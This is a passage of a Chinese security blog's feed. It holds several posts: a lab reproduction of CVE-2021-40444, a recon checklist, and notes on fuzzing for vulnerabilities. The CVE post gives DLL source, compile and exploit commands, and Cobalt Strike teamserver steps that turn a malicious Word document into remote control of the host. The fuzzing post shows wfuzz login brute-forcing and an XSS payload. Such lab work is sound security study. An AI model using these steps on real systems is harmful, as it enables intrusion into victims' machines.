    <summary type="html">&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;国外安全研究人员在8月初公开了Microsoft Exchange多个高危漏洞（ProxyShell）利用的技术细节、PoC</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://lvpsectime.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-40444复现</title>
    <link href="http://lvpsectime.github.io/post/58496fa8.html"/>
    <id>http://lvpsectime.github.io/post/58496fa8.html</id>
    <published>2021-09-24T13:18:48.000Z</published>
    <updated>2021-09-25T04:56:07.008Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>微软MSHTML引擎存在代码执行漏洞，攻击者通过精心制作包含恶意ActiveX的Offcie文档，诱导用户打开，从而实现远程代码执行。当用户主机启用了ActiveX控件，攻击者可通过该漏洞控制受害者主机。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">WindowsServer,version20H2(ServerCoreInstallation)</span><br><span class="line">WindowsServer,version2004(ServerCoreinstallation)</span><br><span class="line">WindowsServer2022(ServerCoreinstallation)</span><br><span class="line">WindowsServer2022</span><br><span class="line">WindowsServer2019(ServerCoreinstallation)</span><br><span class="line">WindowsServer2019</span><br><span class="line">WindowsServer2016(ServerCoreinstallation)</span><br><span class="line">WindowsServer2016</span><br><span class="line">WindowsServer2012R2(ServerCoreinstallation)</span><br><span class="line">WindowsServer2012R2</span><br><span class="line">WindowsServer2012(ServerCoreinstallation)</span><br><span class="line">WindowsServer2012</span><br><span class="line">WindowsServer2008forx64-basedSystemsServicePack2(ServerCoreinstallation)</span><br><span class="line">WindowsServer2008forx64-basedSystemsServicePack2</span><br><span class="line">WindowsServer200832-bitSystemsServicePack2(ServerCoreinstallation)</span><br><span class="line">WindowsServer200832-bitSystemsServicePack2</span><br><span class="line">WindowsServer2008R2forx64-basedSystemsServicePack1(ServerCoreinstallation)</span><br><span class="line">WindowsServer2008R2forx64-basedSystemsServicePack1</span><br><span class="line">WindowsRT8.1</span><br><span class="line">Windows8.1forx64-basedsystems</span><br><span class="line">Windows8.132-bitsystems</span><br><span class="line">Windows7forx64-basedSystemsServicePack1</span><br><span class="line">Windows732-bitSystemsServicePack1</span><br><span class="line">Windows10forx64-basedSystems</span><br><span class="line">Windows1032-bitSystems</span><br><span class="line">Windows10Version21H1forx64-basedSystems</span><br><span class="line">Windows10Version21H1forARM64-basedSystems</span><br><span class="line">Windows10Version21H132-bitSystems</span><br><span class="line">Windows10Version20H2forx64-basedSystems</span><br><span class="line">Windows10Version20H2forARM64-basedSystems</span><br><span class="line">Windows10Version20H232-bitSystems</span><br><span class="line">Windows10Version2004forx64-basedSystems</span><br><span class="line">Windows10Version2004forARM64-basedSystems</span><br><span class="line">Windows10Version200432-bitSystems</span><br><span class="line">Windows10Version1909forx64-basedSystems</span><br><span class="line">Windows10Version1909forARM64-basedSystems</span><br><span class="line">Windows10Version190932-bitSystems</span><br><span class="line">Windows10Version1809forx64-basedSystems</span><br><span class="line">Windows10Version1809forARM64-basedSystems</span><br><span class="line">Windows10Version180932-bitSystems</span><br><span class="line">Windows10Version1607forx64-basedSystems</span><br><span class="line">Windows10Version160732-bitSystems</span><br></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>准备<code>calc.c</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">void exec(void) &#123;</span><br><span class="line">    system(&quot;C:\\Windows\\System32\\calc.exe&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI DllMain(</span><br><span class="line">    HINSTANCE hinstDLL,</span><br><span class="line">    DWORD fdwReason,</span><br><span class="line">    LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">    switch(fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">        case DLL_PROCESS_ATTACH:</span><br><span class="line">            exec();</span><br><span class="line">            break;</span><br><span class="line">        case DLL_THREAD_ATTACH:</span><br><span class="line">            break;</span><br><span class="line">        case DLL_THREAD_DETACH:</span><br><span class="line">            break;</span><br><span class="line">        case DLL_PROCESS_DETACH:</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为dll文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gcc-mingw-w64</span><br><span class="line">i686-w64-mingw32-gcc -shared calc.c -o calc.dll</span><br></pre></td></tr></table></figure><p>下载POC</p><p>下载地址：<a href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></p><p>将dll文件放到test目录下替换掉原有文件</p><p><img src="https://img.sectime.top/imgs/2021/09/621de7d409bba311.png"></p><p>利用dll文件生成docx文档</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 exploit.py generate test/calc.dll http://&lt;SRVIP&gt;</span><br><span class="line"># SRVIP为服务端IP</span><br></pre></td></tr></table></figure><p><img src="https://img.sectime.top/imgs/2021/09/a97fa0cd85ca7f23.png"></p><p>生成了out/document.docx、word.html和word.cab</p><p>开启web服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 exploit.py host 80</span><br></pre></td></tr></table></figure><p><img src="https://img.sectime.top/imgs/2021/09/da44ee8055abd791.png"></p><p>把生成的document.docx上传到靶机，打开成功弹出计算器</p><p><img src="https://img.sectime.top/imgs/2021/09/b84f256198f212f1.png"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们要目标弹出一个计算器有什么用呢？我们要想办法利用这个漏洞。</p><p><strong>上线CS</strong></p><p>在kali上启动一个CS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teamserver 192.168.45.129 123456</span><br></pre></td></tr></table></figure><p><img src="https://img.sectime.top/imgs/2021/09/267403cbd8e22577.png"></p><p>再打开客户端</p><p><img src="https://img.sectime.top/imgs/2021/09/fa2fb8b0d40f69d9.png"></p><p>设置一个监听</p><p><img src="https://img.sectime.top/imgs/2021/09/8709a1f341ac8755.png"></p><p>生成powershell command</p><p><img src="https://img.sectime.top/imgs/2021/09/7573c4b1bc37809d.png"></p><p>修改<code>calc.c</code>，把生成的payload替换，重命名为<code>cs.c</code></p><p><img src="https://img.sectime.top/imgs/2021/09/95509242bbbffb15.png"></p><p>把<code>cs.c</code>编译为<code>cs.dll</code></p><p><img src="https://img.sectime.top/imgs/2021/09/667f88a9efc2a4a9.png"></p><p>把生成的<code>cs.dll</code>复制到test目录下，运行脚本生成word文档</p><p><img src="https://img.sectime.top/imgs/2021/09/d40bd5721f70f4fa.png"></p><p>开启web服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 exploit.py host 80</span><br></pre></td></tr></table></figure><p>把生成的文档上传到目标主机并打开，点击”启用编辑”</p><p><img src="https://img.sectime.top/imgs/2021/09/e1350eab38d6fba1.png"></p><p>上线CS成功</p><p><img src="https://img.sectime.top/imgs/2021/09/11202c1811f1eba9.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;微软MSHTML引擎存在代码执行漏洞，攻击者通过精心制作包含恶意ActiveX的Offcie文档，诱导用户打开，从而实现远程代码执行。当用户</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://lvpsectime.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>信息收集总结</title>
    <link href="http://lvpsectime.github.io/post/ba3bdb90.html"/>
    <id>http://lvpsectime.github.io/post/ba3bdb90.html</id>
    <published>2021-08-16T12:59:27.000Z</published>
    <updated>2021-09-23T13:34:52.097Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h2 id="要收集的信息"><a href="#要收集的信息" class="headerlink" title="要收集的信息"></a>要收集的信息</h2><table><thead><tr><th align="center">收集清单</th><th>详情</th><th>工具</th></tr></thead><tbody><tr><td align="center">基础信息</td><td>1. 注册商 <br>2. 注册人<br>3. 邮箱信息<br>4. DNS解析服务器<br>5. 注册人联系电话<br>6. 企业备案信息</td><td>1. whois<br>2. dnslookup<br>3. 天眼查</td></tr><tr><td align="center">域名信息</td><td>1. 系统域名<br>2. 子域名</td><td>1. OneForAll<br>2. subdomain<br>3. subDomainsBrute<br>4. 子域名挖掘机<br>5. 在线网站</td></tr><tr><td align="center">端口信息</td><td>1. 开放的端口<br>2. 开放端口对应的服务</td><td>1. nmap<br>2. msscan<br>3. 御剑</td></tr><tr><td align="center">系统信息</td><td>1. 操作系统类型<br>2. 中间件类型<br>3. 脚本类型<br>4. 数据库类型<br>5. 服务器类型<br>6. web应用信息<br>-6.1  Web前端框架<br>-6.2 Web应用框架<br>-6.3 Web开放框架<br>-6.4 指定路径下指定名称的js文件或代码<br>-6.5 指定路径下指定名称的css文件或代码<br>-6.6 display:none中的版权信息<br>-6.7 页面底部版权信息，关键字© Powered by等<br>-6.8 注释掉的HTML代码中的内容<br>-6.9 http头中的X-Powered-By中的值，有的应用程序框架会在此值输出<br>-6.10 cookie中的关键字<br>-6.11 robots.txt文件中的关键字<br>-6.12 404报错页面<br>-6.13 302返回时的旗标<br>7. 系统后台<br>8. CMS指纹<br>9. 漏洞库信息<br>10. 编程语言<br>11. 编程框架</td><td></td></tr><tr><td align="center">文件信息</td><td>敏感文件、目录<br>1. WEB-INF/web.xml文件<br>2. 网站备份文件(.rar、.zip、.tar.gz、.bak)、配置文件<br>3. 数据库文件<br>4. SQL注入<br>5.未授权访问<br>6.robots.txt<br>7.后台目录<br>8.网站安装包<br>9.网站上传目录<br>10.mysql管理页面<br>11.PHPinfo<br>12.网站文本编辑器<br>13.SVN信息<br>14.crossdomin.xml<br>15.sitemap.xml<br>16.测试文件<br>17.DS_Store文件<br>18.vim编辑器备份文件(.swp)</td><td></td></tr><tr><td align="center">防火墙</td><td>WAF探测</td><td></td></tr><tr><td align="center">IP信息</td><td>1. 旁站<br>2. C段<br>3. 真实IP<br>4. 别名CNAME<br>5. A<br>6. MX<br>7. AAAA</td><td></td></tr><tr><td align="center">内网入口点信息</td><td>1. 企业邮箱登录口<br>2. VPN登陆口<br>3. 各类OA/crm/sso系统的web入口<br>4. 各类中间件web页面管理入口<br>5. 各类监控系统、防火墙、虚拟化、路由器入口等</td><td></td></tr><tr><td align="center">综合收集</td><td>1. Maltego互联网情报收集<br>2. Recon-NG信息侦查收集工具<br>3. Kali/Parrot中的其他信息收集</td><td></td></tr><tr><td align="center">社会工程</td><td>1. 企业基本信息<br>2. 员工信息（手机号、邮箱、姓名等）、组织框架、企业法人、企业综合信息等<br>3. 网盘信息</td><td></td></tr></tbody></table><h2 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h2><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2><ol><li><p><a href="https://github.com/shmilylty/OneForAll">OneForAll</a></p></li><li><p>Google Hacking</p></li><li><p>空间探测，fofa、shodan</p></li><li><p>爬虫，burp，awvs</p></li><li><p>IP反查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://tools.ipip.net</span><br><span class="line">https://dns.bugscaner.com</span><br></pre></td></tr></table></figure></li><li><p>证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://censys.io</span><br><span class="line">https://crt.sh</span><br></pre></td></tr></table></figure></li><li><p>人工查看https证书</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">证书  ---&gt; 详细信息 ---&gt; 使用者可选名称</span><br></pre></td></tr></table></figure></li><li><p>DNS A记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackertarget.com/find-dns-host-records/</span><br></pre></td></tr></table></figure></li><li><p>APEX_DOMAIN 记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://securitytrails.com/list/apex_domain/sony.net</span><br></pre></td></tr></table></figure></li><li><p>DNS流量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://dnsdumpster.com</span><br></pre></td></tr></table></figure></li><li><p>DNS域传送漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DNS服务器配置不当，导致匿名用户利用DNS域传送协议获取某个域的所有记录。通过可以实现DNS域传送协议的程序，尝试匿名进行DNS域传送，获取记录。</span><br><span class="line">可以用Nmap检测，还可以用nslookup、dig检测</span><br></pre></td></tr></table></figure></li><li><p>爆破枚举</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在线</span><br><span class="line">https://blast.uixsj.cn</span><br><span class="line">https://z.zcjun.com</span><br><span class="line">https://phhpinfo.me.domain</span><br><span class="line">本地</span><br><span class="line">https://github.com/lijiejie/subDomainsBrute</span><br><span class="line">https://github.com/yanxiu0614/subdomain3</span><br><span class="line">御剑子域名挖掘机</span><br></pre></td></tr></table></figure></li></ol><h2 id="真实IP"><a href="#真实IP" class="headerlink" title="真实IP"></a>真实IP</h2><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><h2 id="旁站、C段"><a href="#旁站、C段" class="headerlink" title="旁站、C段"></a>旁站、C段</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;h2 id=&quot;要收集的信息&quot;&gt;&lt;a href=&quot;#要收集的信息&quot; class=&quot;headerlink&quot; title=&quot;要收集的信息&quot;&gt;&lt;/a&gt;要</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="http://lvpsectime.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>常用工具列表</title>
    <link href="http://lvpsectime.github.io/post/51461.html"/>
    <id>http://lvpsectime.github.io/post/51461.html</id>
    <published>2020-12-31T10:41:19.000Z</published>
    <updated>2020-05-05T12:45:45.676Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="689ab1602f692a776af0f28f271bacf18856db83cc75622f6b7cddbd1a43b3ec">94818f561542136a5f12a1f20ba90f292bf3a19ace642ed5d0b7a732ee6f35629bf7ac2faa56ebc10e31613a5c6803543d88c27b7ad5b70aba526b8571bd47b385068a590a45fda91f7995a54a60465504106ec44af0d55842ebac3a9ebc10f2736aa364d53605c13d2c3330965d4e48f3d203668f34061d67fa799bcdbe81fa944853250310a920db486364f5836bc6d24f91431c88914edc26a3c256b0ed7597b31cb32ec08848830ac6e15afeddf37d18470dab6e1b3bc2455b19535cdb87a1ce3d6fcc68c7595c5aaf5d7fd889a4f1646c1ea5388d4d5a9d30a2146e764615bae2b6d352be90cdb25c26232d00340e6cff7c66e6d2bdd10803ac1bd7e561fe8bc25e524209ad1a7e3be82bdcc655855bd9e7a3bc16cc202d00bbedc94784d4b93f239b232707ee850a062c85f00c2c1d6d911845400490016bdcf619923cf13421ab598234e4aaddfa7bb7dbd782a9e7179e2f74ed934c9447e4dd2ca3ba934471118d01d95934ce3f2452dc95ecfbdda5f21ca7f63bce9234356478f0ba746fe101148da8605ade56f6d7d23aab1de4a123f81d6af96a222a7bedac87349cec6692672b5d9babe7acc5df982726f87063177d0de2b831873e3f8651b5e0</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">输入密码，查看文章！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">输入密码，查看文章！</summary>
    
    
    
    <category term="Tools" scheme="http://lvpsectime.github.io/categories/Tools/"/>
    
    
    <category term="Tools" scheme="http://lvpsectime.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>Fuzz与漏洞挖掘</title>
    <link href="http://lvpsectime.github.io/post/60782.html"/>
    <id>http://lvpsectime.github.io/post/60782.html</id>
    <published>2020-12-09T02:23:42.000Z</published>
    <updated>2020-12-09T08:01:08.682Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Fuzz一直是渗透测试中比较重要的技术，之前一直是听说并没有学习过，今天在漏洞银行看了一期视频<a href="https://www.bugbank.cn/live/view.html?id=111909">[87期]看Fuzz与漏洞挖掘擦出火花</a>，感觉讲的挺好的。在此记录一下。</p><h2 id="目录Fuzz-base"><a href="#目录Fuzz-base" class="headerlink" title="目录Fuzz(base)"></a>目录Fuzz(base)</h2><h3 id="Fuzz敏感目录"><a href="#Fuzz敏感目录" class="headerlink" title="Fuzz敏感目录"></a>Fuzz敏感目录</h3><h4 id="御剑"><a href="#御剑" class="headerlink" title="御剑"></a>御剑</h4><p>一款经典的目录扫描工具。</p><p>它的工作原理就是： <code>http://domain.com/+目录字典</code></p><p>一般我们的目录字典是这样子的</p><p><img src="/post/60782/1.png" alt="目录字典"></p><p>那么这种扫描有什么好处呢？就是针对一部分网站可以扫描的全面，只要你的字典足够强大就可以扫描到绝大多部分的目录和文件，来自<code>Blasting_dictionary</code>的爆破字典很好，github地址<code>https://github.com/rootphantomer/Blasting_dictionary</code>这里的103w+目录字典就很符合御剑的模式，其实也就是看程序员的命名。</p><h4 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h4><p>dirsearch是一个基于python的命令行工具，旨在暴力扫描页面结构，包括网页中的目录和文件</p><p><a href="https://github.com/maurosoria/dirsearch">下载地址</a></p><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u url -e php</span><br></pre></td></tr></table></figure><h4 id="Dirb"><a href="#Dirb" class="headerlink" title="Dirb"></a>Dirb</h4><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb url 字典</span><br></pre></td></tr></table></figure><p>kali自带字典<code>/usr/share/wordlist/dirb/...</code></p><h4 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h4><p>wfuzz据说是最好用的一款fuzz工具，不过每个人喜欢的都不一样，适合自己的才是最好的。</p><p>使用方法：<a href="https://blog.csdn.net/JBlock/article/details/88619117">wfuzz使用教程</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -z file,/root/Desktop/Fuzzing/dic.txt URL/test/FUZZ</span><br><span class="line">wfuzz -z file,/root/Desktop/Fuzzing/dic.txt URL/test/FUZZ -hc 404</span><br><span class="line">wfuzz -z file,/root/Desktop/Fuzzing/dic.txt URL/test/FUZZ -hw 123 返回包大小</span><br><span class="line">wfuzz -z file,/root/Desktop/Fuzzing/dic.txt URL/test/FUZZ -hs &quot;Not found&quot; 返回内容</span><br><span class="line">wfuzz -c -z file,/root/dic1.txt -z file,/root/dic2.txt -hs xx1 -hs xx2 -d &quot;log=FUZZ&amp;pwd=FUZ2Z&quot; http://ip/wp-login.php</span><br></pre></td></tr></table></figure><h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="403"><a href="#403" class="headerlink" title="403"></a>403</h4><p><img src="/post/60782/2.png" alt="403"></p><h4 id="Hidden-XSS"><a href="#Hidden-XSS" class="headerlink" title="Hidden XSS"></a>Hidden XSS</h4><p>原文链接：<a href="https://markitzeroday.com/xss/finding/2018/02/03/hidden-xss.html">https://markitzeroday.com/xss/finding/2018/02/03/hidden-xss.html</a></p><p><img src="/post/60782/3.png"></p><p>用<code>Nikto</code>做目录Fuzz，发现了<code>/test/</code>目录，访问<code>/test/</code></p><p><img src="/post/60782/4.png"></p><p>返回<code>NULL</code>，接着使用<code>wfuzz</code>做参数Fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ wfuzz -w /usr/share/wordlists/dirb/common.txt --hh 53 &#x27;http://rob-sec-1.com/test/?FUZZ=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&#x27;</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.3 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: HTTP://rob-sec-1.com/test/?FUZZ=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</span><br><span class="line">Total requests: 4614</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">IDResponse   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">02127:  C=200      9 L       8 W     84 Ch  &quot;item&quot;</span><br><span class="line"></span><br><span class="line">Total time: 14.93025</span><br><span class="line">Processed Requests: 4614</span><br><span class="line">Filtered Requests: 4613</span><br><span class="line">Requests/sec.: 309.0369</span><br></pre></td></tr></table></figure><p>发现了<code>item</code>参数，访问<code>http://domain/test/?item=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>，成功弹窗</p><p><img src="/post/60782/5.png"></p><h2 id="参数Fuzz"><a href="#参数Fuzz" class="headerlink" title="参数Fuzz"></a>参数Fuzz</h2><p>以sqli-labs第29关为例</p><p>使用wfuzz自带的sqlfuzzer测试参数</p><p><img src="/post/60782/6.png" alt="wfuzz"></p><p>把结果导出为html文件</p><p><img src="/post/60782/7.png" alt="wfuzz"></p><p>看一下fuzz的结果</p><p><img src="/post/60782/8.png" alt="wfuzz"></p><p><img src="/post/60782/9.png" alt="wfuzz"></p><p>通过fuzz就发现这一关存在sql语句的报错！那么就有可能存在报错注入！fuzz更多时就会发现一些绕过它waf的情况。</p><h2 id="Payload-Fuzz-bypass"><a href="#Payload-Fuzz-bypass" class="headerlink" title="Payload Fuzz(bypass)"></a>Payload Fuzz(bypass)</h2><p>参考：<a href="https://blog.csdn.net/JBlock/article/details/88617906">FUZZ过某狗</a></p><p>所谓payload fuzz其实就是通过大量测试枚举字符组合，最终得到能够绕过WAF的有效载荷！</p><h2 id="URL跳转与SSRF"><a href="#URL跳转与SSRF" class="headerlink" title="URL跳转与SSRF"></a>URL跳转与SSRF</h2><p>参数Fuzz和payload fuzz</p><h2 id="后缀名Fuzz"><a href="#后缀名Fuzz" class="headerlink" title="后缀名Fuzz"></a>后缀名Fuzz</h2><p>文件上传，fuzz允许上传的后缀名</p><h2 id="CRLF-Fuzz"><a href="#CRLF-Fuzz" class="headerlink" title="CRLF Fuzz"></a>CRLF Fuzz</h2><p><code>CRLF</code>是<code>Carriage-Return Line-Feed</code>的缩写，意思是回车换行，回车(CR, ASCII 13, \r)，换行(LF, ASCII 10, \n)，CRLF字符(%0d%0a)</p><h2 id="XSS-Payload-Fuzz"><a href="#XSS-Payload-Fuzz" class="headerlink" title="XSS Payload Fuzz"></a>XSS Payload Fuzz</h2><p><a href="https://github.com/NytroRST/XSSFuzzer">XSS Fuzzer</a></p><p><img src="/post/60782/10.png" alt="wfuzz"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>感觉Fuzz还是枚举吧，关键在于字典是否强大。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Fuzzdb</span><br><span class="line">https://github.com/Fuzzdb-project/Fuzzdb</span><br><span class="line">seclist</span><br><span class="line">https://github.com/danielmiessler/SecLists</span><br><span class="line">某大牛的字典</span><br><span class="line">https://github.com/bl4de/dictionaries/</span><br><span class="line">https://github.com/1N3/IntruderPayloads/</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;Fuzz一直是渗透测试中比较重要的技术，之前一直是听说并没有学习过，今天在漏洞银行看了一期视频&lt;a href=&quot;https://www.bu</summary>
      
    
    
    
    <category term="渗透" scheme="http://lvpsectime.github.io/categories/%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="Fuzz" scheme="http://lvpsectime.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>Docker从0到1</title>
    <link href="http://lvpsectime.github.io/post/11960.html"/>
    <id>http://lvpsectime.github.io/post/11960.html</id>
    <published>2020-10-21T08:18:12.000Z</published>
    <updated>2020-11-04T06:41:26.933Z</updated>
    
